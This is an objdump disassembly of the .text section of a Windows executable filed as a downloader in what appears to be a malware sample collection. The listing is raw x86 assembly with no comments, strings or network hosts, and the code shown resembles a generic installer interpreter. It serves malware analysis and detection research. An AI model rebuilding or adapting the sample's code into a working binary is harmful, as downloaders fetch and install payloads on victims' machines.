
malware_samples/downloader/665796d93d000ae05647adc01167471e81bbf69f98f584afcf20ec35aaa0db5f.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	83 ec 5c             	sub    $0x5c,%esp
  401003:	83 7c 24 64 0f       	cmpl   $0xf,0x64(%esp)
  401008:	74 2f                	je     0x401039
  40100a:	83 7c 24 64 46       	cmpl   $0x46,0x64(%esp)
  40100f:	8b 4c 24 6c          	mov    0x6c(%esp),%ecx
  401013:	75 0c                	jne    0x401021
  401015:	83 49 18 10          	orl    $0x10,0x18(%ecx)
  401019:	a1 f8 37 42 00       	mov    0x4237f8,%eax
  40101e:	89 41 04             	mov    %eax,0x4(%ecx)
  401021:	51                   	push   %ecx
  401022:	ff 74 24 6c          	push   0x6c(%esp)
  401026:	ff 74 24 6c          	push   0x6c(%esp)
  40102a:	ff 74 24 6c          	push   0x6c(%esp)
  40102e:	ff 15 5c 82 40 00    	call   *0x40825c
  401034:	e9 61 01 00 00       	jmp    0x40119a
  401039:	53                   	push   %ebx
  40103a:	55                   	push   %ebp
  40103b:	8b 2d 10 40 42 00    	mov    0x424010,%ebp
  401041:	8d 44 24 24          	lea    0x24(%esp),%eax
  401045:	56                   	push   %esi
  401046:	57                   	push   %edi
  401047:	50                   	push   %eax
  401048:	ff 74 24 74          	push   0x74(%esp)
  40104c:	ff 15 54 82 40 00    	call   *0x408254
  401052:	83 64 24 10 00       	andl   $0x0,0x10(%esp)
  401057:	8b d8                	mov    %eax,%ebx
  401059:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  40105d:	50                   	push   %eax
  40105e:	ff 74 24 74          	push   0x74(%esp)
  401062:	ff 15 4c 82 40 00    	call   *0x40824c
  401068:	8b 74 24 28          	mov    0x28(%esp),%esi
  40106c:	83 64 24 28 00       	andl   $0x0,0x28(%esp)
  401071:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  401075:	89 74 24 74          	mov    %esi,0x74(%esp)
  401079:	e9 91 00 00 00       	jmp    0x40110f
  40107e:	0f b6 45 56          	movzbl 0x56(%ebp),%eax
  401082:	8b fe                	mov    %esi,%edi
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	2b f9                	sub    %ecx,%edi
  401089:	0f b6 4d 52          	movzbl 0x52(%ebp),%ecx
  40108d:	0f af cf             	imul   %edi,%ecx
  401090:	03 c1                	add    %ecx,%eax
  401092:	0f b6 4d 51          	movzbl 0x51(%ebp),%ecx
  401096:	99                   	cltd
  401097:	f7 fe                	idiv   %esi
  401099:	0f af cf             	imul   %edi,%ecx
  40109c:	0f b6 f0             	movzbl %al,%esi
  40109f:	0f b6 45 55          	movzbl 0x55(%ebp),%eax
  4010a3:	0f af 44 24 20       	imul   0x20(%esp),%eax
  4010a8:	c1 e6 08             	shl    $0x8,%esi
  4010ab:	03 c1                	add    %ecx,%eax
  4010ad:	0f b6 4d 50          	movzbl 0x50(%ebp),%ecx
  4010b1:	99                   	cltd
  4010b2:	f7 7c 24 74          	idivl  0x74(%esp)
  4010b6:	0f af cf             	imul   %edi,%ecx
  4010b9:	0f b6 c0             	movzbl %al,%eax
  4010bc:	0b f0                	or     %eax,%esi
  4010be:	0f b6 45 54          	movzbl 0x54(%ebp),%eax
  4010c2:	0f af 44 24 20       	imul   0x20(%esp),%eax
  4010c7:	c1 e6 08             	shl    $0x8,%esi
  4010ca:	03 c1                	add    %ecx,%eax
  4010cc:	99                   	cltd
  4010cd:	f7 7c 24 74          	idivl  0x74(%esp)
  4010d1:	0f b6 c0             	movzbl %al,%eax
  4010d4:	0b f0                	or     %eax,%esi
  4010d6:	8d 44 24 10          	lea    0x10(%esp),%eax
  4010da:	50                   	push   %eax
  4010db:	89 74 24 18          	mov    %esi,0x18(%esp)
  4010df:	ff 15 50 80 40 00    	call   *0x408050
  4010e5:	83 44 24 28 04       	addl   $0x4,0x28(%esp)
  4010ea:	8b f0                	mov    %eax,%esi
  4010ec:	56                   	push   %esi
  4010ed:	8d 44 24 20          	lea    0x20(%esp),%eax
  4010f1:	50                   	push   %eax
  4010f2:	53                   	push   %ebx
  4010f3:	ff 15 48 82 40 00    	call   *0x408248
  4010f9:	56                   	push   %esi
  4010fa:	ff 15 60 80 40 00    	call   *0x408060
  401100:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  401104:	8b 74 24 74          	mov    0x74(%esp),%esi
  401108:	83 c1 04             	add    $0x4,%ecx
  40110b:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  40110f:	3b ce                	cmp    %esi,%ecx
  401111:	0f 8c 67 ff ff ff    	jl     0x40107e
  401117:	83 7d 58 ff          	cmpl   $0xffffffff,0x58(%ebp)
  40111b:	74 68                	je     0x401185
  40111d:	ff 75 34             	push   0x34(%ebp)
  401120:	ff 15 64 80 40 00    	call   *0x408064
  401126:	8b f0                	mov    %eax,%esi
  401128:	89 74 24 74          	mov    %esi,0x74(%esp)
  40112c:	85 f6                	test   %esi,%esi
  40112e:	74 55                	je     0x401185
  401130:	6a 01                	push   $0x1
  401132:	53                   	push   %ebx
  401133:	c7 44 24 24 10 00 00 	movl   $0x10,0x24(%esp)
  40113a:	00 
  40113b:	c7 44 24 28 08 00 00 	movl   $0x8,0x28(%esp)
  401142:	00 
  401143:	ff 15 58 80 40 00    	call   *0x408058
  401149:	ff 75 58             	push   0x58(%ebp)
  40114c:	53                   	push   %ebx
  40114d:	ff 15 54 80 40 00    	call   *0x408054
  401153:	8b 3d 5c 80 40 00    	mov    0x40805c,%edi
  401159:	56                   	push   %esi
  40115a:	53                   	push   %ebx
  40115b:	ff d7                	call   *%edi
  40115d:	68 20 08 00 00       	push   $0x820
  401162:	8b f0                	mov    %eax,%esi
  401164:	8d 44 24 20          	lea    0x20(%esp),%eax
  401168:	50                   	push   %eax
  401169:	6a ff                	push   $0xffffffff
  40116b:	68 00 38 42 00       	push   $0x423800
  401170:	53                   	push   %ebx
  401171:	ff 15 58 82 40 00    	call   *0x408258
  401177:	56                   	push   %esi
  401178:	53                   	push   %ebx
  401179:	ff d7                	call   *%edi
  40117b:	ff 74 24 74          	push   0x74(%esp)
  40117f:	ff 15 60 80 40 00    	call   *0x408060
  401185:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  401189:	50                   	push   %eax
  40118a:	ff 74 24 74          	push   0x74(%esp)
  40118e:	ff 15 50 82 40 00    	call   *0x408250
  401194:	5f                   	pop    %edi
  401195:	5e                   	pop    %esi
  401196:	5d                   	pop    %ebp
  401197:	33 c0                	xor    %eax,%eax
  401199:	5b                   	pop    %ebx
  40119a:	83 c4 5c             	add    $0x5c,%esp
  40119d:	c2 10 00             	ret    $0x10
  4011a0:	51                   	push   %ecx
  4011a1:	53                   	push   %ebx
  4011a2:	55                   	push   %ebp
  4011a3:	8b 2d 2c 40 42 00    	mov    0x42402c,%ebp
  4011a9:	33 c9                	xor    %ecx,%ecx
  4011ab:	56                   	push   %esi
  4011ac:	57                   	push   %edi
  4011ad:	8b 3d 10 40 42 00    	mov    0x424010,%edi
  4011b3:	81 c7 94 00 00 00    	add    $0x94,%edi
  4011b9:	89 7c 24 10          	mov    %edi,0x10(%esp)
  4011bd:	83 3f 00             	cmpl   $0x0,(%edi)
  4011c0:	74 48                	je     0x40120a
  4011c2:	33 d2                	xor    %edx,%edx
  4011c4:	85 ed                	test   %ebp,%ebp
  4011c6:	74 3e                	je     0x401206
  4011c8:	8b 35 28 40 42 00    	mov    0x424028,%esi
  4011ce:	8b 7c 24 18          	mov    0x18(%esp),%edi
  4011d2:	83 c6 04             	add    $0x4,%esi
  4011d5:	8b 5e 04             	mov    0x4(%esi),%ebx
  4011d8:	f6 c3 06             	test   $0x6,%bl
  4011db:	75 1a                	jne    0x4011f7
  4011dd:	85 ff                	test   %edi,%edi
  4011df:	74 06                	je     0x4011e7
  4011e1:	83 3c 97 00          	cmpl   $0x0,(%edi,%edx,4)
  4011e5:	74 10                	je     0x4011f7
  4011e7:	33 c0                	xor    %eax,%eax
  4011e9:	83 e3 01             	and    $0x1,%ebx
  4011ec:	40                   	inc    %eax
  4011ed:	d3 e3                	shl    %cl,%ebx
  4011ef:	d3 e0                	shl    %cl,%eax
  4011f1:	23 06                	and    (%esi),%eax
  4011f3:	3b c3                	cmp    %ebx,%eax
  4011f5:	75 0b                	jne    0x401202
  4011f7:	42                   	inc    %edx
  4011f8:	81 c6 18 04 00 00    	add    $0x418,%esi
  4011fe:	3b d5                	cmp    %ebp,%edx
  401200:	72 d3                	jb     0x4011d5
  401202:	8b 7c 24 10          	mov    0x10(%esp),%edi
  401206:	3b d5                	cmp    %ebp,%edx
  401208:	74 0d                	je     0x401217
  40120a:	41                   	inc    %ecx
  40120b:	83 c7 04             	add    $0x4,%edi
  40120e:	89 7c 24 10          	mov    %edi,0x10(%esp)
  401212:	83 f9 20             	cmp    $0x20,%ecx
  401215:	72 a6                	jb     0x4011bd
  401217:	5f                   	pop    %edi
  401218:	5e                   	pop    %esi
  401219:	5d                   	pop    %ebp
  40121a:	8b c1                	mov    %ecx,%eax
  40121c:	5b                   	pop    %ebx
  40121d:	59                   	pop    %ecx
  40121e:	c2 04 00             	ret    $0x4
  401221:	8b 54 24 04          	mov    0x4(%esp),%edx
  401225:	69 c2 18 04 00 00    	imul   $0x418,%edx,%eax
  40122b:	53                   	push   %ebx
  40122c:	56                   	push   %esi
  40122d:	8b 35 28 40 42 00    	mov    0x424028,%esi
  401233:	8b 5c 30 08          	mov    0x8(%eax,%esi,1),%ebx
  401237:	f6 c3 02             	test   $0x2,%bl
  40123a:	74 4f                	je     0x40128b
  40123c:	57                   	push   %edi
  40123d:	8b 3d 2c 40 42 00    	mov    0x42402c,%edi
  401243:	42                   	inc    %edx
  401244:	33 c9                	xor    %ecx,%ecx
  401246:	3b d7                	cmp    %edi,%edx
  401248:	73 40                	jae    0x40128a
  40124a:	69 c2 18 04 00 00    	imul   $0x418,%edx,%eax
  401250:	83 c6 08             	add    $0x8,%esi
  401253:	03 f0                	add    %eax,%esi
  401255:	f6 06 02             	testb  $0x2,(%esi)
  401258:	74 03                	je     0x40125d
  40125a:	41                   	inc    %ecx
  40125b:	eb 22                	jmp    0x40127f
  40125d:	f6 06 04             	testb  $0x4,(%esi)
  401260:	74 09                	je     0x40126b
  401262:	8b c1                	mov    %ecx,%eax
  401264:	49                   	dec    %ecx
  401265:	85 c0                	test   %eax,%eax
  401267:	74 21                	je     0x40128a
  401269:	eb 14                	jmp    0x40127f
  40126b:	f6 06 10             	testb  $0x10,(%esi)
  40126e:	75 0f                	jne    0x40127f
  401270:	8b 06                	mov    (%esi),%eax
  401272:	33 c3                	xor    %ebx,%eax
  401274:	83 e0 01             	and    $0x1,%eax
  401277:	31 06                	xor    %eax,(%esi)
  401279:	8b 3d 2c 40 42 00    	mov    0x42402c,%edi
  40127f:	42                   	inc    %edx
  401280:	81 c6 18 04 00 00    	add    $0x418,%esi
  401286:	3b d7                	cmp    %edi,%edx
  401288:	72 cb                	jb     0x401255
  40128a:	5f                   	pop    %edi
  40128b:	5e                   	pop    %esi
  40128c:	5b                   	pop    %ebx
  40128d:	c2 04 00             	ret    $0x4
  401290:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401294:	56                   	push   %esi
  401295:	8b 35 28 40 42 00    	mov    0x424028,%esi
  40129b:	57                   	push   %edi
  40129c:	33 ff                	xor    %edi,%edi
  40129e:	83 f9 20             	cmp    $0x20,%ecx
  4012a1:	73 35                	jae    0x4012d8
  4012a3:	39 3d 2c 40 42 00    	cmp    %edi,0x42402c
  4012a9:	76 2d                	jbe    0x4012d8
  4012ab:	83 c6 08             	add    $0x8,%esi
  4012ae:	8b 16                	mov    (%esi),%edx
  4012b0:	f6 c2 06             	test   $0x6,%dl
  4012b3:	75 14                	jne    0x4012c9
  4012b5:	33 c0                	xor    %eax,%eax
  4012b7:	40                   	inc    %eax
  4012b8:	d3 e0                	shl    %cl,%eax
  4012ba:	85 46 fc             	test   %eax,-0x4(%esi)
  4012bd:	74 05                	je     0x4012c4
  4012bf:	83 ca 01             	or     $0x1,%edx
  4012c2:	eb 03                	jmp    0x4012c7
  4012c4:	83 e2 fe             	and    $0xfffffffe,%edx
  4012c7:	89 16                	mov    %edx,(%esi)
  4012c9:	47                   	inc    %edi
  4012ca:	81 c6 18 04 00 00    	add    $0x418,%esi
  4012d0:	3b 3d 2c 40 42 00    	cmp    0x42402c,%edi
  4012d6:	72 d6                	jb     0x4012ae
  4012d8:	5f                   	pop    %edi
  4012d9:	5e                   	pop    %esi
  4012da:	c2 04 00             	ret    $0x4
  4012dd:	51                   	push   %ecx
  4012de:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4012e2:	8b 15 28 40 42 00    	mov    0x424028,%edx
  4012e8:	53                   	push   %ebx
  4012e9:	55                   	push   %ebp
  4012ea:	56                   	push   %esi
  4012eb:	69 f1 18 04 00 00    	imul   $0x418,%ecx,%esi
  4012f1:	57                   	push   %edi
  4012f2:	33 ff                	xor    %edi,%edi
  4012f4:	89 54 24 10          	mov    %edx,0x10(%esp)
  4012f8:	8b df                	mov    %edi,%ebx
  4012fa:	03 f2                	add    %edx,%esi
  4012fc:	8b 46 08             	mov    0x8(%esi),%eax
  4012ff:	a8 02                	test   $0x2,%al
  401301:	74 0d                	je     0x401310
  401303:	39 5c 24 1c          	cmp    %ebx,0x1c(%esp)
  401307:	74 07                	je     0x401310
  401309:	83 e0 be             	and    $0xffffffbe,%eax
  40130c:	41                   	inc    %ecx
  40130d:	89 46 08             	mov    %eax,0x8(%esi)
  401310:	3b 0d 2c 40 42 00    	cmp    0x42402c,%ecx
  401316:	73 58                	jae    0x401370
  401318:	69 c1 18 04 00 00    	imul   $0x418,%ecx,%eax
  40131e:	8d 69 01             	lea    0x1(%ecx),%ebp
  401321:	89 44 24 18          	mov    %eax,0x18(%esp)
  401325:	8b 54 10 08          	mov    0x8(%eax,%edx,1),%edx
  401329:	f6 c2 02             	test   $0x2,%dl
  40132c:	74 16                	je     0x401344
  40132e:	6a 01                	push   $0x1
  401330:	51                   	push   %ecx
  401331:	e8 a7 ff ff ff       	call   0x4012dd
  401336:	8b 54 24 18          	mov    0x18(%esp),%edx
  40133a:	8b e8                	mov    %eax,%ebp
  40133c:	8b 44 24 10          	mov    0x10(%esp),%eax
  401340:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401344:	f6 c2 04             	test   $0x4,%dl
  401347:	75 31                	jne    0x40137a
  401349:	f6 c2 40             	test   $0x40,%dl
  40134c:	8d 4f 01             	lea    0x1(%edi),%ecx
  40134f:	0f 44 cf             	cmove  %edi,%ecx
  401352:	8b f9                	mov    %ecx,%edi
  401354:	83 e2 01             	and    $0x1,%edx
  401357:	74 01                	je     0x40135a
  401359:	47                   	inc    %edi
  40135a:	85 d2                	test   %edx,%edx
  40135c:	8d 43 01             	lea    0x1(%ebx),%eax
  40135f:	8b 54 24 10          	mov    0x10(%esp),%edx
  401363:	8b cd                	mov    %ebp,%ecx
  401365:	0f 44 d8             	cmove  %eax,%ebx
  401368:	3b 2d 2c 40 42 00    	cmp    0x42402c,%ebp
  40136e:	72 a8                	jb     0x401318
  401370:	33 c0                	xor    %eax,%eax
  401372:	5f                   	pop    %edi
  401373:	5e                   	pop    %esi
  401374:	5d                   	pop    %ebp
  401375:	5b                   	pop    %ebx
  401376:	59                   	pop    %ecx
  401377:	c2 08 00             	ret    $0x8
  40137a:	85 ff                	test   %edi,%edi
  40137c:	74 17                	je     0x401395
  40137e:	8b 46 08             	mov    0x8(%esi),%eax
  401381:	85 db                	test   %ebx,%ebx
  401383:	74 05                	je     0x40138a
  401385:	83 c8 40             	or     $0x40,%eax
  401388:	eb 08                	jmp    0x401392
  40138a:	25 7f ff ff ff       	and    $0xffffff7f,%eax
  40138f:	83 c8 01             	or     $0x1,%eax
  401392:	89 46 08             	mov    %eax,0x8(%esi)
  401395:	8b c5                	mov    %ebp,%eax
  401397:	eb d9                	jmp    0x401372
  401399:	56                   	push   %esi
  40139a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40139e:	57                   	push   %edi
  40139f:	85 f6                	test   %esi,%esi
  4013a1:	78 70                	js     0x401413
  4013a3:	bf ff ff ff 7f       	mov    $0x7fffffff,%edi
  4013a8:	a1 30 40 42 00       	mov    0x424030,%eax
  4013ad:	6b ce 1c             	imul   $0x1c,%esi,%ecx
  4013b0:	03 c1                	add    %ecx,%eax
  4013b2:	83 38 01             	cmpl   $0x1,(%eax)
  4013b5:	74 5c                	je     0x401413
  4013b7:	50                   	push   %eax
  4013b8:	e8 8d 01 00 00       	call   0x40154a
  4013bd:	3b c7                	cmp    %edi,%eax
  4013bf:	74 59                	je     0x40141a
  4013c1:	50                   	push   %eax
  4013c2:	e8 45 1b 00 00       	call   0x402f0c
  4013c7:	8b c8                	mov    %eax,%ecx
  4013c9:	85 c9                	test   %ecx,%ecx
  4013cb:	75 04                	jne    0x4013d1
  4013cd:	41                   	inc    %ecx
  4013ce:	46                   	inc    %esi
  4013cf:	eb 07                	jmp    0x4013d8
  4013d1:	49                   	dec    %ecx
  4013d2:	8b c6                	mov    %esi,%eax
  4013d4:	8b f1                	mov    %ecx,%esi
  4013d6:	2b c8                	sub    %eax,%ecx
  4013d8:	83 7c 24 10 00       	cmpl   $0x0,0x10(%esp)
  4013dd:	74 30                	je     0x40140f
  4013df:	a1 d0 37 42 00       	mov    0x4237d0,%eax
  4013e4:	6a 00                	push   $0x0
  4013e6:	ff 35 cc 37 42 00    	push   0x4237cc
  4013ec:	03 c1                	add    %ecx,%eax
  4013ee:	68 30 75 00 00       	push   $0x7530
  4013f3:	50                   	push   %eax
  4013f4:	a3 d0 37 42 00       	mov    %eax,0x4237d0
  4013f9:	ff 15 e8 80 40 00    	call   *0x4080e8
  4013ff:	50                   	push   %eax
  401400:	68 02 04 00 00       	push   $0x402
  401405:	ff 74 24 1c          	push   0x1c(%esp)
  401409:	ff 15 40 82 40 00    	call   *0x408240
  40140f:	85 f6                	test   %esi,%esi
  401411:	79 95                	jns    0x4013a8
  401413:	33 c0                	xor    %eax,%eax
  401415:	5f                   	pop    %edi
  401416:	5e                   	pop    %esi
  401417:	c2 08 00             	ret    $0x8
  40141a:	8b c7                	mov    %edi,%eax
  40141c:	eb f7                	jmp    0x401415
  40141e:	81 ec 10 01 00 00    	sub    $0x110,%esp
  401424:	8d 04 24             	lea    (%esp),%eax
  401427:	55                   	push   %ebp
  401428:	56                   	push   %esi
  401429:	8b b4 24 24 01 00 00 	mov    0x124(%esp),%esi
  401430:	57                   	push   %edi
  401431:	8b bc 24 28 01 00 00 	mov    0x128(%esp),%edi
  401438:	81 e6 00 03 00 00    	and    $0x300,%esi
  40143e:	50                   	push   %eax
  40143f:	8b c6                	mov    %esi,%eax
  401441:	83 e7 01             	and    $0x1,%edi
  401444:	83 c8 09             	or     $0x9,%eax
  401447:	50                   	push   %eax
  401448:	ff b4 24 2c 01 00 00 	push   0x12c(%esp)
  40144f:	ff b4 24 2c 01 00 00 	push   0x12c(%esp)
  401456:	e8 ad 4b 00 00       	call   0x406008
  40145b:	85 c0                	test   %eax,%eax
  40145d:	0f 85 c4 00 00 00    	jne    0x401527
  401463:	33 ed                	xor    %ebp,%ebp
  401465:	f6 84 24 28 01 00 00 	testb  $0x2,0x128(%esp)
  40146c:	02 
  40146d:	74 24                	je     0x401493
  40146f:	55                   	push   %ebp
  401470:	55                   	push   %ebp
  401471:	55                   	push   %ebp
  401472:	55                   	push   %ebp
  401473:	8d 44 24 20          	lea    0x20(%esp),%eax
  401477:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  40147b:	50                   	push   %eax
  40147c:	8d 44 24 28          	lea    0x28(%esp),%eax
  401480:	50                   	push   %eax
  401481:	55                   	push   %ebp
  401482:	ff 74 24 28          	push   0x28(%esp)
  401486:	ff 15 10 80 40 00    	call   *0x408010
  40148c:	3d 03 01 00 00       	cmp    $0x103,%eax
  401491:	75 70                	jne    0x401503
  401493:	68 05 01 00 00       	push   $0x105
  401498:	8d 44 24 18          	lea    0x18(%esp),%eax
  40149c:	50                   	push   %eax
  40149d:	55                   	push   %ebp
  40149e:	8b 2d 0c 80 40 00    	mov    0x40800c,%ebp
  4014a4:	eb 28                	jmp    0x4014ce
  4014a6:	85 ff                	test   %edi,%edi
  4014a8:	75 59                	jne    0x401503
  4014aa:	ff b4 24 28 01 00 00 	push   0x128(%esp)
  4014b1:	8d 44 24 18          	lea    0x18(%esp),%eax
  4014b5:	50                   	push   %eax
  4014b6:	ff 74 24 14          	push   0x14(%esp)
  4014ba:	e8 5f ff ff ff       	call   0x40141e
  4014bf:	85 c0                	test   %eax,%eax
  4014c1:	75 15                	jne    0x4014d8
  4014c3:	68 05 01 00 00       	push   $0x105
  4014c8:	8d 44 24 18          	lea    0x18(%esp),%eax
  4014cc:	50                   	push   %eax
  4014cd:	57                   	push   %edi
  4014ce:	ff 74 24 18          	push   0x18(%esp)
  4014d2:	ff d5                	call   *%ebp
  4014d4:	85 c0                	test   %eax,%eax
  4014d6:	74 ce                	je     0x4014a6
  4014d8:	ff 74 24 0c          	push   0xc(%esp)
  4014dc:	ff 15 00 80 40 00    	call   *0x408000
  4014e2:	6a 03                	push   $0x3
  4014e4:	e8 ba 50 00 00       	call   0x4065a3
  4014e9:	85 c0                	test   %eax,%eax
  4014eb:	75 27                	jne    0x401514
  4014ed:	ff b4 24 24 01 00 00 	push   0x124(%esp)
  4014f4:	ff b4 24 24 01 00 00 	push   0x124(%esp)
  4014fb:	ff 15 04 80 40 00    	call   *0x408004
  401501:	eb 24                	jmp    0x401527
  401503:	ff 74 24 0c          	push   0xc(%esp)
  401507:	ff 15 00 80 40 00    	call   *0x408000
  40150d:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  401512:	eb 13                	jmp    0x401527
  401514:	6a 00                	push   $0x0
  401516:	56                   	push   %esi
  401517:	ff b4 24 2c 01 00 00 	push   0x12c(%esp)
  40151e:	ff b4 24 2c 01 00 00 	push   0x12c(%esp)
  401525:	ff d0                	call   *%eax
  401527:	5f                   	pop    %edi
  401528:	5e                   	pop    %esi
  401529:	5d                   	pop    %ebp
  40152a:	81 c4 10 01 00 00    	add    $0x110,%esp
  401530:	c2 0c 00             	ret    $0xc
  401533:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401537:	a1 10 40 42 00       	mov    0x424010,%eax
  40153c:	6a 00                	push   $0x0
  40153e:	ff 74 88 6c          	push   0x6c(%eax,%ecx,4)
  401542:	e8 52 fe ff ff       	call   0x401399
  401547:	c2 04 00             	ret    $0x4
  40154a:	81 ec c0 01 00 00    	sub    $0x1c0,%esp
  401550:	53                   	push   %ebx
  401551:	8b 15 f8 37 42 00    	mov    0x4237f8,%edx
  401557:	b8 00 50 42 00       	mov    $0x425000,%eax
  40155c:	55                   	push   %ebp
  40155d:	56                   	push   %esi
  40155e:	8b b4 24 d0 01 00 00 	mov    0x1d0(%esp),%esi
  401565:	33 db                	xor    %ebx,%ebx
  401567:	57                   	push   %edi
  401568:	6a 07                	push   $0x7
  40156a:	59                   	pop    %ecx
  40156b:	8d 7c 24 24          	lea    0x24(%esp),%edi
  40156f:	89 54 24 14          	mov    %edx,0x14(%esp)
  401573:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401575:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  401579:	8b f9                	mov    %ecx,%edi
  40157b:	8b 74 24 28          	mov    0x28(%esp),%esi
  40157f:	8b ee                	mov    %esi,%ebp
  401581:	c1 e5 0a             	shl    $0xa,%ebp
  401584:	03 e8                	add    %eax,%ebp
  401586:	c1 e7 0a             	shl    $0xa,%edi
  401589:	03 f8                	add    %eax,%edi
  40158b:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  40158f:	8d 44 24 28          	lea    0x28(%esp),%eax
  401593:	89 4c 24 54          	mov    %ecx,0x54(%esp)
  401597:	a3 e4 a0 40 00       	mov    %eax,0x40a0e4
  40159c:	8b 44 24 24          	mov    0x24(%esp),%eax
  4015a0:	83 c0 fe             	add    $0xfffffffe,%eax
  4015a3:	83 f8 41             	cmp    $0x41,%eax
  4015a6:	0f 87 50 17 00 00    	ja     0x402cfc
  4015ac:	ff 24 85 16 2d 40 00 	jmp    *0x402d16(,%eax,4)
  4015b3:	8b c6                	mov    %esi,%eax
  4015b5:	e9 4e 17 00 00       	jmp    0x402d08
  4015ba:	53                   	push   %ebx
  4015bb:	56                   	push   %esi
  4015bc:	e8 a1 44 00 00       	call   0x405a62
  4015c1:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  4015c6:	e9 3d 17 00 00       	jmp    0x402d08
  4015cb:	ff 05 ec 37 42 00    	incl   0x4237ec
  4015d1:	85 d2                	test   %edx,%edx
  4015d3:	74 ec                	je     0x4015c1
  4015d5:	53                   	push   %ebx
  4015d6:	ff 15 38 82 40 00    	call   *0x408238
  4015dc:	eb e3                	jmp    0x4015c1
  4015de:	56                   	push   %esi
  4015df:	e8 28 19 00 00       	call   0x402f0c
  4015e4:	48                   	dec    %eax
  4015e5:	53                   	push   %ebx
  4015e6:	50                   	push   %eax
  4015e7:	e8 ad fd ff ff       	call   0x401399
  4015ec:	e9 17 17 00 00       	jmp    0x402d08
  4015f1:	53                   	push   %ebx
  4015f2:	56                   	push   %esi
  4015f3:	e8 6a 44 00 00       	call   0x405a62
  4015f8:	e9 ff 16 00 00       	jmp    0x402cfc
  4015fd:	53                   	push   %ebx
  4015fe:	e8 53 18 00 00       	call   0x402e56
  401603:	59                   	pop    %ecx
  401604:	33 c9                	xor    %ecx,%ecx
  401606:	41                   	inc    %ecx
  401607:	3b c1                	cmp    %ecx,%eax
  401609:	0f 4f c8             	cmovg  %eax,%ecx
  40160c:	51                   	push   %ecx
  40160d:	ff 15 04 81 40 00    	call   *0x408104
  401613:	e9 e4 16 00 00       	jmp    0x402cfc
  401618:	52                   	push   %edx
  401619:	ff 15 24 82 40 00    	call   *0x408224
  40161f:	e9 d8 16 00 00       	jmp    0x402cfc
  401624:	8b 44 24 30          	mov    0x30(%esp),%eax
  401628:	85 c0                	test   %eax,%eax
  40162a:	7f 2a                	jg     0x401656
  40162c:	75 0e                	jne    0x40163c
  40162e:	8b 04 b5 c0 40 42 00 	mov    0x4240c0(,%esi,4),%eax
  401635:	89 04 b5 80 40 42 00 	mov    %eax,0x424080(,%esi,4)
  40163c:	6a 01                	push   $0x1
  40163e:	e8 13 18 00 00       	call   0x402e56
  401643:	59                   	pop    %ecx
  401644:	8b c8                	mov    %eax,%ecx
  401646:	8b 44 24 28          	mov    0x28(%esp),%eax
  40164a:	89 0c 85 c0 40 42 00 	mov    %ecx,0x4240c0(,%eax,4)
  401651:	e9 a6 16 00 00       	jmp    0x402cfc
  401656:	8b 04 b5 80 40 42 00 	mov    0x424080(,%esi,4),%eax
  40165d:	89 04 b5 c0 40 42 00 	mov    %eax,0x4240c0(,%esi,4)
  401664:	e9 93 16 00 00       	jmp    0x402cfc
  401669:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  40166d:	6a 04                	push   $0x4
  40166f:	8b 14 8d c0 40 42 00 	mov    0x4240c0(,%ecx,4),%edx
  401676:	8b c2                	mov    %edx,%eax
  401678:	23 44 24 38          	and    0x38(%esp),%eax
  40167c:	89 04 8d c0 40 42 00 	mov    %eax,0x4240c0(,%ecx,4)
  401683:	33 c0                	xor    %eax,%eax
  401685:	85 d2                	test   %edx,%edx
  401687:	59                   	pop    %ecx
  401688:	0f 44 c1             	cmove  %ecx,%eax
  40168b:	8b 44 04 28          	mov    0x28(%esp,%eax,1),%eax
  40168f:	e9 74 16 00 00       	jmp    0x402d08
  401694:	ff 34 8d c0 40 42 00 	push   0x4240c0(,%ecx,4)
  40169b:	55                   	push   %ebp
  40169c:	e8 25 4c 00 00       	call   0x4062c6
  4016a1:	e9 56 16 00 00       	jmp    0x402cfc
  4016a6:	a1 e4 37 42 00       	mov    0x4237e4,%eax
  4016ab:	8b 3d 30 82 40 00    	mov    0x408230,%edi
  4016b1:	85 c0                	test   %eax,%eax
  4016b3:	74 08                	je     0x4016bd
  4016b5:	51                   	push   %ecx
  4016b6:	50                   	push   %eax
  4016b7:	ff d7                	call   *%edi
  4016b9:	8b 74 24 28          	mov    0x28(%esp),%esi
  4016bd:	a1 e8 37 42 00       	mov    0x4237e8,%eax
  4016c2:	85 c0                	test   %eax,%eax
  4016c4:	0f 84 32 16 00 00    	je     0x402cfc
  4016ca:	56                   	push   %esi
  4016cb:	50                   	push   %eax
  4016cc:	ff d7                	call   *%edi
  4016ce:	e9 29 16 00 00       	jmp    0x402cfc
  4016d3:	6a f0                	push   $0xfffffff0
  4016d5:	e8 b8 17 00 00       	call   0x402e92
  4016da:	ff 74 24 2c          	push   0x2c(%esp)
  4016de:	50                   	push   %eax
  4016df:	ff 15 14 81 40 00    	call   *0x408114
  4016e5:	85 c0                	test   %eax,%eax
  4016e7:	0f 85 0f 16 00 00    	jne    0x402cfc
  4016ed:	33 c0                	xor    %eax,%eax
  4016ef:	40                   	inc    %eax
  4016f0:	e9 0b 16 00 00       	jmp    0x402d00
  4016f5:	6a f0                	push   $0xfffffff0
  4016f7:	e8 96 17 00 00       	call   0x402e92
  4016fc:	8b f8                	mov    %eax,%edi
  4016fe:	57                   	push   %edi
  4016ff:	e8 6f 51 00 00       	call   0x406873
  401704:	8b f0                	mov    %eax,%esi
  401706:	85 f6                	test   %esi,%esi
  401708:	74 58                	je     0x401762
  40170a:	6a 5c                	push   $0x5c
  40170c:	56                   	push   %esi
  40170d:	e8 90 4b 00 00       	call   0x4062a2
  401712:	8b f0                	mov    %eax,%esi
  401714:	8a 06                	mov    (%esi),%al
